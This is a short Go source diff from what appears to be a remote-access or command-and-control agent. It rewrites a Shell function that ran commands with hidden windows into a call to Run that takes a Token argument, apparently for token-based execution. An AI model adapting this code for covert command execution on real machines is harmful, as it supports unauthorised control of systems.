@@ -12,9 +12,8 @@ import (
 	"main/util"
 	"net"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"runtime"
+	//"runtime"
 	"strconv"
 	"strings"
 	"syscall"
@@ -123,36 +122,8 @@ func ParseCommandShell(b []byte) (string, []byte, error) {
 	return app, cmd, nil
 }
 
-func Shell(path string, args []byte) ([]byte, error) {
-	switch runtime.GOOS {
-	case "windows":
-		args = bytes.Trim(args, " ")
-		argsArray := strings.Split(string(args), " ")
-		cmd := exec.Command(path, argsArray...)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			return nil, errors.New("exec failed with: " + err.Error())
-		}
-		return out, nil
-	case "darwin":
-		path = "/bin/bash"
-		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
-	case "linux":
-		path = "/bin/sh"
-		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
-	}
-	args = bytes.Trim(args, " ")
-	startPos := bytes.Index(args, []byte("-c"))
-	args = args[startPos+3:]
-	argsArray := []string{"-c", string(args)}
-	cmd := exec.Command(path, argsArray...)
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		return nil, errors.New("exec failed with: " + err.Error())
-	}
-	return out, nil
-
+func Shell(path string, args []byte, Token uintptr) ([]byte, error) {
+	return Run(append([]byte(path), args...), Token)
 }
 
 func ParseCommandUpload(b []byte) ([]byte, []byte) {
